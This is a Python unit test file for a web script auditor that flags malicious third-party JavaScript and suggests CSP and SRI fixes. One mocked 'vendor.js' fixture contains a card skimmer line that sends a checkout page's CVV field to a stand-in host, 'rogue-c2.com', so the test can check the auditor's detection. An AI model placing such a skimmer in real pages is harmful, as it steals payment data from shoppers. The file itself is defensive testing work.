"""Unit tests for auditor orchestration."""

from __future__ import annotations

import pytest

from scriptsentinel.auditor import audit_url
from scriptsentinel.models import AuditReport


@pytest.mark.anyio
async def test_audit_url_unreachable():
    report = await audit_url("http://nonexistent.invalid.monar.local:9999", timeout=1.0)
    assert isinstance(report, AuditReport)
    assert report.overall_risk == "ERROR"
    assert "error" in report.summary
    assert report.error is not None
    assert report.to_dict()["overall_risk"] == "ERROR"


@pytest.mark.anyio
async def test_audit_url_mocked(monkeypatch):
    class MockResponse:
        def __init__(self, status_code: int, text: str, headers: dict[str, str], content: bytes = b""):
            self.status_code = status_code
            self.text = text
            self.content = content or text.encode("utf-8")
            self.headers = headers

        def raise_for_status(self):
            if not 200 <= self.status_code < 300:
                raise ValueError("HTTP status failure")

    class MockAsyncClient:
        def __init__(self, *args, **kwargs):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, exc_type, exc_val, exc_tb):
            pass

        async def get(self, url: str):
            if "vendor.js" in url:
                return MockResponse(
                    200,
                    'document.addEventListener("submit", function(e) { fetch("https://rogue-c2.com/exfil?d=" + document.getElementById("cvv").value); });',
                    {"content-type": "application/javascript"},
                )
            # Main page
            html = """
            <!doctype html>
            <html>
            <head>
                <script src="https://cdn.example.com/vendor.js"></script>
                <script>console.log("inline");</script>
            </head>
            <body><h1>Checkout</h1></body>
            </html>
            """
            return MockResponse(
                200,
                html,
                {"content-security-policy": "default-src 'self'; script-src 'self' 'unsafe-inline'"},
            )

    import httpx
    monkeypatch.setattr(httpx, "AsyncClient", MockAsyncClient)

    report = await audit_url("https://checkout.test.com/pay")
    assert report.status_code == 200
    assert len(report.scripts) == 2
    assert report.overall_risk in ("CRITICAL", "HIGH")
    assert report.remediation is not None
    assert "hardened_csp" in report.remediation
    assert len(report.remediation.sri_replacement_tags) >= 1

    # Verify serialization
    d = report.to_dict()
    assert d["target_url"] == "https://checkout.test.com/pay"
    assert "csp" in d
    assert "scripts" in d
